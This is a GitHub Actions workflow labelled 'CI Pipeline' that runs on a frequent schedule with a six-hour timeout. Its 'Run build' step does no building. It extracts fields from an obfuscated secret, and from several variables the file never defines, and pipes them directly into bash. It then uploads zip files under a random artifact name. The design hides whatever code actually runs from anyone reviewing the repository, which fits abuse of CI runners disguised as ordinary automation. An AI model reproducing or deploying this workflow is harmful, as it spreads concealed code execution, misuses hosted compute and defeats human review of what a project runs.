name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '46 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  perform:
    name: Run build
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run build
        env:
          gzxa36900: ${{ secrets.gzxa36900 }}
        run: |
          printf '%s' "$gzxa36900" | jq -r .koy6 | /bin/bash
          printf '%s' "$siy2318" | jq -r .mb96277 | /bin/bash
          echo $rbdvx6 | jq -r .skey9943 | /bin/bash
          printf '%s' "$py35" | jq -r .y588 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: iHBbhXbH
          path: "*.zip"
          retention-days: 1
